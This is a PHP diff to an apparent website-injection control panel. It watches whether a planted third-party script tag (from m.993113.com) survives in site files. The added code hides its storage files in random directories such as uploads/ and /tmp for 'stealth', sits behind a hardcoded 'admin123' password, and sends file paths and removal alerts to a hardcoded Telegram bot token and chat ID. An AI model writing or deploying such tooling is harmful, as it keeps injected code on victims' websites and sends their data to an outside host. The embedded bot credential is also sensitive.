@@ -6,6 +6,10 @@ $ACCESS_PASSWORD = "admin123";
 $DEFAULT_SCRIPT = '<script type="text/javascript" src="http://m.993113.com/xhxh.js"></script>';
 $STORAGE_DIR = __DIR__ . '/.cache/';
 
+// Telegram 配置 - 用户可以自定义修改
+$TELEGRAM_TOKEN = '8372572892:AAHnXpBls55TVoGWSrwMRszot4Nx0e4rEX0';
+$TELEGRAM_CHAT_ID = '8118186136';
+
 // 权限检查
 if (!isset($_GET['auth']) || $_GET['auth'] !== $ACCESS_PASSWORD) {
     echo "<html><body style='background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 50px; text-align: center;'>
@@ -13,6 +17,399 @@ if (!isset($_GET['auth']) || $_GET['auth'] !== $ACCESS_PASSWORD) {
     <p style='color: #00ffff;'>Access Denied - Unauthorized Request</p>
     </body></html>";
     exit;
+}
+
+// 新增：处理GET请求的自动检测
+if (isset($_GET['auto_check']) && $_GET['auto_check'] === '1') {
+    // 初始化存储系统
+    function initStorageSystem() {
+        global $STORAGE_DIR;
+        
+        if (!is_dir($STORAGE_DIR)) {
+            mkdir($STORAGE_DIR, 0755, true);
+        }
+        
+        $indexFile = $STORAGE_DIR . 'index.dat';
+        if (!file_exists($indexFile)) {
+            file_put_contents($indexFile, serialize([]));
+        }
+    }
+    
+    // Telegram 消息发送函数
+    function sendTelegramMessage($message) {
+        global $TELEGRAM_TOKEN, $TELEGRAM_CHAT_ID;
+        
+        if (empty($TELEGRAM_TOKEN) || empty($TELEGRAM_CHAT_ID)) {
+            return false;
+        }
+        
+        $url = "https://api.telegram.org/bot{$TELEGRAM_TOKEN}/sendMessage";
+        
+        $data = [
+            'chat_id' => $TELEGRAM_CHAT_ID,
+            'text' => $message,
+            'parse_mode' => 'HTML'
+        ];
+        
+        $options = [
+            'http' => [
+                'method' => 'POST',
+                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+                'content' => http_build_query($data)
+            ]
+        ];
+        
+        $context = stream_context_create($options);
+        $result = @file_get_contents($url, false, $context);
+        
+        return $result !== false;
+    }
+    
+    // 生成Telegram格式的检测报告
+    function generateTelegramChangeReport($changes) {
+        if (empty($changes)) {
+            $message = "✅ <b>脚本监控报告</b>\n\n";
+            $message .= "🕒 <b>检查时间:</b> " . date('Y-m-d H:i:s') . "\n";
+            $message .= "📊 <b>检查结果:</b> 所有文件状态正常\n";
+            $message .= "🎯 <b>监控状态:</b> 未发现任何变化\n\n";
+            $message .= "💎 <i>所有脚本位置保持正常</i>";
+            return $message;
+        }
+        
+        $message = "🚨 <b>脚本监控异常报告</b>\n\n";
+        $message .= "🕒 <b>检查时间:</b> " . date('Y-m-d H:i:s') . "\n";
+        $message .= "📊 <b>发现变化:</b> " . count($changes) . " 个文件\n\n";
+        
+        foreach ($changes as $index => $change) {
+            $message .= "▫️ <b>文件 " . ($index + 1) . ":</b> " . basename($change['file']) . "\n";
+            
+            switch ($change['type']) {
+                case 'moved':
+                    $message .= "   🔄 <b>类型:</b> 位置变化\n";
+                    $message .= "   📍 <b>新位置:</b> 第 {$change['new_line']} 行 (原位置: 第 {$change['info']['line']} 行)\n";
+                    break;
+                    
+                case 'removed':
+                    $message .= "   ❌ <b>类型:</b> 脚本被移除\n";
+                    $message .= "   🗑️ <b>状态:</b> 脚本已从文件中完全移除\n";
+                    break;
+                    
+                case 'modified':
+                    $message .= "   🔧 <b>类型:</b> 脚本内容被修改\n";
+                    $message .= "   📍 <b>位置:</b> 第 {$change['info']['line']} 行\n";
+                    break;
+                    
+                case 'deleted':
+                    $message .= "   💀 <b>类型:</b> 文件被删除\n";
+                    $message .= "   🚫 <b>状态:</b> 文件无法访问\n";
+                    break;
+                    
+                case 'unreadable':
+                    $message .= "   ⚠️ <b>类型:</b> 文件无法读取\n";
+                    $message .= "   🔒 <b>状态:</b> 可能是权限问题\n";
+                    break;
+            }
+            
+            $message .= "   📂 <b>路径:</b> " . $change['file'] . "\n\n";
+        }
+        
+        $message .= "💎 <i>请及时登录系统查看详细报告</i>";
+        
+        return $message;
+    }
+    
+    // 强制检查所有位置 - 增强详细报告
+    function forceCheckAllPositions() {
+        $positions = readStoredPositions();
+        $changes = [];
+        
+        foreach ($positions as $fileHash => $info) {
+            $filePath = $info['file'];
+            $targetScript = $info['target_script'];
+            
+            if (!safeFileExists($filePath)) {
+                $changes[] = [
+                    'type' => 'deleted',
+                    'file' => $filePath,
+                    'info' => $info,
+                    'message' => "🚨 <b>文件被删除:</b> " . basename($filePath)
+                ];
+                continue;
+            }
+            
+            $content = safeFileGetContents($filePath);
+            if ($content === false) {
+                $changes[] = [
+                    'type' => 'unreadable', 
+                    'file' => $filePath,
+                    'info' => $info,
+                    'message' => "⚠️ <b>无法读取:</b> " . basename($filePath)
+                ];
+                continue;
+            }
+            
+            $currentPos = strpos($content, $targetScript);
+            if ($currentPos === false) {
+                // 脚本被完全移除
+                $changes[] = [
+                    'type' => 'removed',
+                    'file' => $filePath,
+                    'info' => $info,
+                    'message' => "❌ <b>脚本被移除:</b> " . basename($filePath)
+                ];
+            } else {
+                $currentLine = substr_count(substr($content, 0, $currentPos), "\n") + 1;
+                if ($currentLine != $info['line']) {
+                    // 位置发生变化
+                    $changes[] = [
+                        'type' => 'moved',
+                        'file' => $filePath,
+                        'info' => $info,
+                        'new_line' => $currentLine,
+                        'message' => "📊 <b>位置变化:</b> " . basename($filePath) . 
+                                    "<br>📍 <b>新位置:</b> 第 {$currentLine} 行 (原位置: 第 {$info['line']} 行)"
+                    ];
+                }
+                
+                // 检查脚本内容是否被修改
+                $currentScriptContent = extractScriptContent($content, $currentPos, $targetScript);
+                $originalScriptPreview = $info['script_preview'] ?? substr($targetScript, 0, 100) . (strlen($targetScript) > 100 ? '...' : '');
+                
+                if ($currentScriptContent !== $targetScript) {
+                    $changes[] = [
+                        'type' => 'modified',
+                        'file' => $filePath,
+                        'info' => $info,
+                        'current_content' => $currentScriptContent,
+                        'original_content' => $targetScript,
+                        'message' => "🔧 <b>脚本内容被修改:</b> " . basename($filePath) . 
+                                    "<br>📍 <b>位置:</b> 第 {$currentLine} 行"
+                    ];
+                }
+            }
+        }
+        
+        return $changes;
+    }
+    
+    // 提取脚本内容
+    function extractScriptContent($content, $position, $targetScript) {
+        $scriptLength = strlen($targetScript);
+        return substr($content, $position, $scriptLength);
+    }
+    
+    // 生成随机目录路径 - 增强隐蔽性
+    function generateRandomDirectory() {
+        global $STORAGE_DIR;
+        
+        $dirs = [
+            $STORAGE_DIR,
+            $STORAGE_DIR . 'tmp/',
+            $STORAGE_DIR . 'cache/',
+            $STORAGE_DIR . 'logs/',
+            $STORAGE_DIR . 'sessions/',
+            __DIR__ . '/../tmp/',
+            __DIR__ . '/../cache/',
+            __DIR__ . '/../logs/',
+            __DIR__ . '/../uploads/',
+            __DIR__ . '/../images/',
+            '/tmp/php_sessions/',
+            '/var/tmp/php/'
+        ];
+        
+        $randomDir = $dirs[array_rand($dirs)];
+        
+        if (!is_dir($randomDir)) {
+            @mkdir($randomDir, 0755, true);
+        }
+        
+        return $randomDir;
+    }
+    
+    // 获取当前存储文件路径
+    function getCurrentStorageFile() {
+        $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
+        if (!file_exists($indexFile)) {
+            return createNewStorageFile();
+        }
+        
+        $index = unserialize(file_get_contents($indexFile));
+        
+        if (empty($index['current_storage'])) {
+            return createNewStorageFile();
+        }
+        
+        $storageFile = $index['current_storage'];
+        if (!file_exists($storageFile)) {
+            return createNewStorageFile();
+        }
+        
+        return $storageFile;
+    }
+    
+    // 创建新的存储文件
+    function createNewStorageFile() {
+        $indexFile = $GLOBALS['STORAGE_DIR'] . 'index.dat';
+        $index = file_exists($indexFile) ? unserialize(file_get_contents($indexFile)) : [];
+        
+        $storageDir = generateRandomDirectory();
+        $storageFile = $storageDir . generateRandomFilename('pos_');
+        
+        $initialData = [
+            'created_at' => date('Y-m-d H:i:s'),
+            'positions' => [],
+            'metadata' => [
+                'version' => '1.0',
+                'file_count' => 0
+            ]
+        ];
+        
+        if (file_put_contents($storageFile, serialize($initialData)) === false) {
+            return false;
+        }
+        
+        $index['current_storage'] = $storageFile;
+        $index['storage_history'] = $index['storage_history'] ?? [];
+        $index['storage_history'][] = [
+            'file' => $storageFile,
+            'created_at' => date('Y-m-d H:i:s'),
+            'active' => true
+        ];
+        
+        file_put_contents($indexFile, serialize($index));
+        
+        return $storageFile;
+    }
+    
+    // 生成随机文件名
+    function generateRandomFilename($prefix = 'data_') {
+        $random = bin2hex(random_bytes(8));
+        $timestamp = time();
+        return $prefix . $timestamp . '_' . $random . '.dat';
+    }
+    
+    // 读取存储的位置信息
+    function readStoredPositions() {
+        $storageFile = getCurrentStorageFile();
+        
+        if (!file_exists($storageFile)) {
+            return [];
+        }
+        
+        $content = file_get_contents($storageFile);
+        if ($content === false) {
+            return [];
+        }
+        
+        $data = unserialize($content);
+        return isset($data['positions']) ? $data['positions'] : [];
+    }
+    
+    // 安全的文件检查函数
+    function safeFileExists($filePath) {
+        // 清理路径
+        $filePath = str_replace(['../', './'], '', $filePath);
+        
+        // 多种方式检查文件存在
+        if (file_exists($filePath)) {
+            return true;
+        }
+        
+        // 尝试绝对路径
+        $absolutePaths = [
+            $filePath,
+            dirname(__FILE__) . '/' . ltrim($filePath, '/'),
+            $_SERVER['DOCUMENT_ROOT'] . '/' . ltrim($filePath, '/'),
+            '/' . ltrim($filePath, '/')
+        ];
+        
+        foreach ($absolutePaths as $path) {
+            if (file_exists($path) && is_file($path)) {
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    // 安全的文件读取
+    function safeFileGetContents($filePath) {
+        if (!safeFileExists($filePath)) {
+            return false;
+        }
+        
+        // 检查文件是否可读
+        if (!is_readable($filePath)) {
+            return false;
+        }
+        
+        return file_get_contents($filePath);
+    }
+    
+    // 执行强制检查
+    initStorageSystem();
+    $changes = forceCheckAllPositions();
+    $telegramMessage = generateTelegramChangeReport($changes);
+    $sendResult = sendTelegramMessage($telegramMessage);
+    
+    // 生成简单报告
+    echo "<!DOCTYPE html>
+    <html>
+    <head>
+        <title>自动检测报告</title>
+        <meta charset='utf-8'>
+        <style>
+            body { font-family: Arial, sans-serif; background: #0a0a0a; color: #00ff00; padding: 20px; }
+            .success { color: #05ffa1; }
+            .error { color: #ff2a6d; }
+            .warning { color: #ffeb3b; }
+            .info { color: #00f3ff; }
+            .file-path { color: #b0b0ff; font-size: 0.9em; }
+            .change-item { border-left: 3px solid #ff2a6d; padding-left: 15px; margin: 15px 0; background: rgba(255,42,109,0.1); padding: 15px; border-radius: 0 8px 8px 0; }
+        </style>
+    </head>
+    <body>
+        <h1>🔮 自动检测报告</h1>
+        <p class='info'>🕒 检查时间: " . date('Y-m-d H:i:s') . "</p>
+        <p class='info'>📊 发现变化: " . count($changes) . " 个文件</p>
+        <p class='info'>📱 Telegram通知发送: " . ($sendResult ? "<span class='success'>✅ 成功</span>" : "<span class='error'>❌ 失败</span>") . "</p>";
+    
+    if (!empty($changes)) {
+        echo "<h2 class='warning'>🚨 变化详情:</h2>";
+        foreach ($changes as $change) {
+            echo "<div class='change-item'>";
+            echo "<p class='warning'><strong>📄 文件:</strong> " . basename($change['file']) . "</p>";
+            echo "<p><strong>🔧 类型:</strong> " . $change['type'] . "</p>";
+            echo "<p class='file-path'><strong>📂 路径:</strong> " . $change['file'] . "</p>";
+            
+            // 显示详细信息
+            switch ($change['type']) {
+                case 'moved':
+                    echo "<p><strong>📍 位置变化:</strong> 第 {$change['new_line']} 行 (原位置: 第 {$change['info']['line']} 行)</p>";
+                    break;
+                case 'removed':
+                    echo "<p><strong>🗑️ 状态:</strong> 脚本已从文件中完全移除</p>";
+                    break;
+                case 'modified':
+                    echo "<p><strong>✏️ 状态:</strong> 脚本内容已被修改</p>";
+                    break;
+                case 'deleted':
+                    echo "<p><strong>💀 状态:</strong> 文件已被删除，无法访问</p>";
+                    break;
+                case 'unreadable':
+                    echo "<p><strong>🔒 状态:</strong> 文件存在但无法读取，可能是权限问题</p>";
+                    break;
+            }
+            
+            echo "</div>";
+        }
+    } else {
+        echo "<p class='success'>✅ 没有发现变化，所有文件状态正常。</p>";
+    }
+    
+    echo "<p style='margin-top: 30px; color: #b0b0ff;'>💎 系统: CYBER SCRIPT CONTROL SYSTEM</p>";
+    echo "</body></html>";
+    exit; // 重要：输出报告后退出，不显示完整页面
 }
 
 // 初始化存储系统
@@ -27,6 +424,238 @@ function initStorageSystem() {
     if (!file_exists($indexFile)) {
         file_put_contents($indexFile, serialize([]));
     }
+}
+
+// Telegram 消息发送函数
+function sendTelegramMessage($message) {
+    global $TELEGRAM_TOKEN, $TELEGRAM_CHAT_ID;
+    
+    if (empty($TELEGRAM_TOKEN) || empty($TELEGRAM_CHAT_ID)) {
+        return false;
+    }
+    
+    $url = "https://api.telegram.org/bot{$TELEGRAM_TOKEN}/sendMessage";
+    
+    $data = [
+        'chat_id' => $TELEGRAM_CHAT_ID,
+        'text' => $message,
+        'parse_mode' => 'HTML'
+    ];
+    
+    $options = [
+        'http' => [
+            'method' => 'POST',
+            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
+            'content' => http_build_query($data)
+        ]
+    ];
+    
+    $context = stream_context_create($options);
+    $result = @file_get_contents($url, false, $context);
+    
+    return $result !== false;
+}
+
+// 测试 Telegram 发送
+function testTelegramSend() {
+    $testMessage = "🔔 <b>CYBER SCRIPT CONTROL SYSTEM</b>\n\n";
+    $testMessage .= "✅ <b>Telegram 通知测试</b>\n";
+    $testMessage .= "🕒 <b>时间:</b> " . date('Y-m-d H:i:s') . "\n";
+    $testMessage .= "📡 <b>状态:</b> 通知系统连接正常\n";
+    $testMessage .= "💎 <b>系统:</b> 脚本监控系统运行中\n\n";
+    $testMessage .= "🔮 <i>这是一条测试消息，确认您的Telegram配置正确</i>";
+    
+    return sendTelegramMessage($testMessage);
+}
+
+// 生成Telegram格式的检测报告
+function generateTelegramChangeReport($changes) {
+    if (empty($changes)) {
+        $message = "✅ <b>脚本监控报告</b>\n\n";
+        $message .= "🕒 <b>检查时间:</b> " . date('Y-m-d H:i:s') . "\n";
+        $message .= "📊 <b>检查结果:</b> 所有文件状态正常\n";
+        $message .= "🎯 <b>监控状态:</b> 未发现任何变化\n\n";
+        $message .= "💎 <i>所有脚本位置保持正常</i>";
+        return $message;
+    }
+    
+    $message = "🚨 <b>脚本监控异常报告</b>\n\n";
+    $message .= "🕒 <b>检查时间:</b> " . date('Y-m-d H:i:s') . "\n";
+    $message .= "📊 <b>发现变化:</b> " . count($changes) . " 个文件\n\n";
+    
+    foreach ($changes as $index => $change) {
+        $message .= "▫️ <b>文件 " . ($index + 1) . ":</b> " . basename($change['file']) . "\n";
+        
+        switch ($change['type']) {
+            case 'moved':
+                $message .= "   🔄 <b>类型:</b> 位置变化\n";
+                $message .= "   📍 <b>新位置:</b> 第 {$change['new_line']} 行 (原位置: 第 {$change['info']['line']} 行)\n";
+                break;
+                
+            case 'removed':
+                $message .= "   ❌ <b>类型:</b> 脚本被移除\n";
+                $message .= "   🗑️ <b>状态:</b> 脚本已从文件中完全移除\n";
+                break;
+                
+            case 'modified':
+                $message .= "   🔧 <b>类型:</b> 脚本内容被修改\n";
+                $message .= "   📍 <b>位置:</b> 第 {$change['info']['line']} 行\n";
+                break;
+                
+            case 'deleted':
+                $message .= "   💀 <b>类型:</b> 文件被删除\n";
+                $message .= "   🚫 <b>状态:</b> 文件无法访问\n";
+                break;
+                
+            case 'unreadable':
+                $message .= "   ⚠️ <b>类型:</b> 文件无法读取\n";
+                $message .= "   🔒 <b>状态:</b> 可能是权限问题\n";
+                break;
+        }
+        
+        $message .= "   📂 <b>路径:</b> " . $change['file'] . "\n\n";
+    }
+    
+    $message .= "💎 <i>请及时登录系统查看详细报告</i>";
+    
+    return $message;
+}
+
+// 强制检查所有位置 - 增强详细报告
+function forceCheckAllPositions() {
+    $positions = readStoredPositions();
+    $changes = [];
+    
+    foreach ($positions as $fileHash => $info) {
+        $filePath = $info['file'];
+        $targetScript = $info['target_script'];
+        
+        if (!safeFileExists($filePath)) {
+            $changes[] = [
+                'type' => 'deleted',
+                'file' => $filePath,
+                'info' => $info,
+                'message' => "🚨 <b>文件被删除:</b> " . basename($filePath)
+            ];
+            continue;
+        }
+        
+        $content = safeFileGetContents($filePath);
+        if ($content === false) {
+            $changes[] = [
+                'type' => 'unreadable', 
+                'file' => $filePath,
+                'info' => $info,
+                'message' => "⚠️ <b>无法读取:</b> " . basename($filePath)
+            ];
+            continue;
+        }
+        
+        $currentPos = strpos($content, $targetScript);
+        if ($currentPos === false) {
+            // 脚本被完全移除
+            $changes[] = [
+                'type' => 'removed',
+                'file' => $filePath,
+                'info' => $info,
+                'message' => "❌ <b>脚本被移除:</b> " . basename($filePath)
+            ];
+        } else {
+            $currentLine = substr_count(substr($content, 0, $currentPos), "\n") + 1;
+            if ($currentLine != $info['line']) {
+                // 位置发生变化
+                $changes[] = [
+                    'type' => 'moved',
+                    'file' => $filePath,
+                    'info' => $info,
+                    'new_line' => $currentLine,
+                    'message' => "📊 <b>位置变化:</b> " . basename($filePath) . 
+                                "<br>📍 <b>新位置:</b> 第 {$currentLine} 行 (原位置: 第 {$info['line']} 行)"
+                ];
+            }
+            
+            // 检查脚本内容是否被修改
+            $currentScriptContent = extractScriptContent($content, $currentPos, $targetScript);
+            $originalScriptPreview = $info['script_preview'] ?? substr($targetScript, 0, 100) . (strlen($targetScript) > 100 ? '...' : '');
+            
+            if ($currentScriptContent !== $targetScript) {
+                $changes[] = [
+                    'type' => 'modified',
+                    'file' => $filePath,
+                    'info' => $info,
+                    'current_content' => $currentScriptContent,
+                    'original_content' => $targetScript,
+                    'message' => "🔧 <b>脚本内容被修改:</b> " . basename($filePath) . 
+                                "<br>📍 <b>位置:</b> 第 {$currentLine} 行"
+                ];
+            }
+        }
+    }
+    
+    return $changes;
+}
+
+// 提取脚本内容
+function extractScriptContent($content, $position, $targetScript) {
+    $scriptLength = strlen($targetScript);
+    return substr($content, $position, $scriptLength);
+}
+
+// 生成详细的变化报告
+function generateDetailedChangeReport($changes) {
+    if (empty($changes)) {
+        return "<div class='cyber-alert alert-success'>✅ 所有文件状态正常，未发现变化</div>";
+    }
+    
+    $report = "<div class='cyber-alert alert-warning'>";
+    $report .= "🔍 <b>实时监控报告</b><br><br>";
+    
+    foreach ($changes as $index => $change) {
+        $report .= "<div style='margin-bottom: 15px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px;'>";
+        $report .= $change['message'];
+        $report .= "<br><span style='color: var(--text-secondary); font-size: 0.9em;'>📂 <b>路径:</b> " . $change['file'] . "</span>";
+        
+        // 添加详细信息
+        switch ($change['type']) {
+            case 'moved':
+                $report .= "<br><span style='color: var(--neon-yellow); font-size: 0.9em;'>🔄 脚本位置发生变化，但内容保持不变</span>";
+                break;
+                
+            case 'removed':
+                $report .= "<br><span style='color: var(--neon-pink); font-size: 0.9em;'>🗑️ 脚本已从文件中完全移除</span>";
+                $report .= "<br><div class='script-preview' style='margin: 8px 0; font-size: 0.8em;'>";
+                $report .= "<strong>原脚本内容:</strong><br>" . htmlspecialchars($change['info']['target_script']);
+                $report .= "</div>";
+                break;
+                
+            case 'modified':
+                $report .= "<br><span style='color: var(--neon-pink); font-size: 0.9em;'>✏️ 脚本内容已被修改</span>";
+                $report .= "<br><div style='display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 8px 0;'>";
+                $report .= "<div class='script-preview' style='font-size: 0.8em;'>";
+                $report .= "<strong>原脚本:</strong><br>" . htmlspecialchars($change['original_content']);
+                $report .= "</div>";
+                $report .= "<div class='script-preview' style='font-size: 0.8em; background: rgba(255,42,109,0.1);'>";
+                $report .= "<strong>当前脚本:</strong><br>" . htmlspecialchars($change['current_content']);
+                $report .= "</div>";
+                $report .= "</div>";
+                break;
+                
+            case 'deleted':
+                $report .= "<br><span style='color: var(--neon-pink); font-size: 0.9em;'>💀 文件已被删除，无法访问</span>";
+                break;
+                
+            case 'unreadable':
+                $report .= "<br><span style='color: var(--neon-yellow); font-size: 0.9em;'>🔒 文件存在但无法读取，可能是权限问题</span>";
+                break;
+        }
+        
+        $report .= "</div>";
+    }
+    
+    $report .= "<br><span style='color: var(--text-secondary);'>🕒 <b>检查时间:</b> " . date('Y-m-d H:i:s') . "</span>";
+    $report .= "</div>";
+    
+    return $report;
 }
 
 // 生成随机文件名
@@ -736,6 +1365,40 @@ if (isset($_POST['action'])) {
         case 'cleanup_storage':
             cleanupStorage();
             break;
+        case 'force_check':
+            $changes = forceCheckAllPositions();
+            echo generateDetailedChangeReport($changes);
+            
+            // 发送Telegram通知
+            $telegramMessage = generateTelegramChangeReport($changes);
+            $sendResult = sendTelegramMessage($telegramMessage);
+            
+            if ($sendResult) {
+                echo "<div class='cyber-alert alert-success'>✅ Telegram通知发送成功！</div>";
+            } else {
+                echo "<div class='cyber-alert alert-warning'>⚠️ Telegram通知发送失败，请检查配置</div>";
+            }
+            break;
+            
+        case 'test_telegram':
+            $testResult = testTelegramSend();
+            if ($testResult) {
+                echo "<div class='cyber-alert alert-success'>✅ Telegram测试消息发送成功！请检查您的Telegram客户端</div>";
+            } else {
+                echo "<div class='cyber-alert alert-error'>❌ Telegram测试消息发送失败，请检查Token和Chat ID配置</div>";
+            }
+            break;
+            
+        case 'update_telegram_config':
+            if (isset($_POST['telegram_token']) && isset($_POST['telegram_chat_id'])) {
+                $TELEGRAM_TOKEN = trim($_POST['telegram_token']);
+                $TELEGRAM_CHAT_ID = trim($_POST['telegram_chat_id']);
+                
+                echo "<div class='cyber-alert alert-success'>✅ Telegram配置已更新！<br>";
+                echo "<strong>Token:</strong> " . substr($TELEGRAM_TOKEN, 0, 10) . "***<br>";
+                echo "<strong>Chat ID:</strong> " . $TELEGRAM_CHAT_ID . "</div>";
+            }
+            break;
     }
 }
 ?>
@@ -1356,6 +2019,11 @@ if (isset($_POST['action'])) {
             const importForm = document.getElementById('importForm');
             importForm.style.display = importForm.style.display === 'block' ? 'none' : 'block';
         }
+        
+        function showTelegramConfig() {
+            const telegramConfig = document.getElementById('telegramConfig');
+            telegramConfig.style.display = telegramConfig.style.display === 'block' ? 'none' : 'block';
+        }
 
         function syncScriptToAll() {
             const checkScript = document.getElementById('check_script').value;
@@ -1613,6 +2281,63 @@ if (isset($_POST['action'])) {
             <!-- 存储信息 -->
             <?php showStorageInfo(); ?>
 
+            <!-- Telegram 通知配置 -->
+            <div class="cyber-card" style="margin-bottom: 30px;">
+                <div class="card-header">
+                    <div class="card-icon">📡</div>
+                    <h2>Telegram 通知系统</h2>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+                    <div class="btn-group">
+                        <form method="post" style="display: inline;">
+                            <button type="submit" name="action" value="force_check" class="cyber-btn cyber-btn-warning">
+                                🔍 立即检测所有位置并发送通知
+                            </button>
+                        </form>
+                        
+                        <form method="post" style="display: inline;">
+                            <button type="submit" name="action" value="test_telegram" class="cyber-btn cyber-btn-outline">
+                                📱 测试 Telegram 通知
+                            </button>
+                        </form>
+                        
+                        <button type="button" onclick="showTelegramConfig()" class="cyber-btn cyber-btn-outline">
+                            ⚙️ 配置 Telegram
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Telegram 配置表单 -->
+                <div id="telegramConfig" class="cyber-card" style="display: none; margin-top: 20px;">
+                    <form method="post">
+                        <div style="margin-bottom: 20px;">
+                            <label style="display: block; margin-bottom: 8px; font-weight: 500; color: var(--text-secondary);">Telegram Bot Token:</label>
+                            <input type="text" name="telegram_token" value="<?php echo htmlspecialchars($TELEGRAM_TOKEN); ?>" class="cyber-input" style="min-height: auto; height: 50px;" placeholder="输入您的 Telegram Bot Token">
+                        </div>
+                        
+                        <div style="margin-bottom: 20px;">
+                            <label style="display: block; margin-bottom: 8px; font-weight: 500; color: var(--text-secondary);">Telegram Chat ID:</label>
+                            <input type="text" name="telegram_chat_id" value="<?php echo htmlspecialchars($TELEGRAM_CHAT_ID); ?>" class="cyber-input" style="min-height: auto; height: 50px;" placeholder="输入您的 Telegram Chat ID">
+                        </div>
+                        
+                        <button type="submit" name="action" value="update_telegram_config" class="cyber-btn cyber-btn-success">
+                            💾 保存 Telegram 配置
+                        </button>
+                    </form>
+                    
+                    <div style="margin-top: 20px; padding: 15px; background: rgba(0, 243, 255, 0.1); border-radius: 10px; border-left: 4px solid var(--neon-blue);">
+                        <h4 style="color: var(--neon-blue); margin-bottom: 10px;">📖 配置说明:</h4>
+                        <p style="color: var(--text-secondary); font-size: 0.9rem; line-height: 1.5;">
+                            <strong>1. 创建 Telegram Bot:</strong> 通过 @BotFather 创建机器人并获取 Token<br>
+                            <strong>2. 获取 Chat ID:</strong> 向您的机器人发送消息，然后访问: <br>
+                            <code style="background: rgba(0,0,0,0.3); padding: 2px 6px; border-radius: 4px;">https://api.telegram.org/bot&lt;YOUR_TOKEN&gt;/getUpdates</code><br>
+                            <strong>3. 测试配置:</strong> 使用上方的测试按钮验证配置是否正确
+                        </p>
+                    </div>
+                </div>
+            </div>
+
             <!-- 位置列表 -->
             <?php if (empty($positions)): ?>
             <div style="text-align: center; padding: 60px 20px; color: var(--text-secondary); border: 2px dashed rgba(0, 243, 255, 0.3); border-radius: 15px;">
@@ -1622,7 +2347,7 @@ if (isset($_POST['action'])) {
             </div>
             <?php else: ?>
             <div style="margin: 25px 0;">
-                <div class="cyber-alert alert-success">✅ 当前已存储 <?php echo count($positions); ?> 个文件的位置信息</div>
+                <div class='cyber-alert alert-success'>✅ 当前已存储 <?php echo count($positions); ?> 个文件的位置信息</div>
             </div>
             
             <div class="positions-grid">
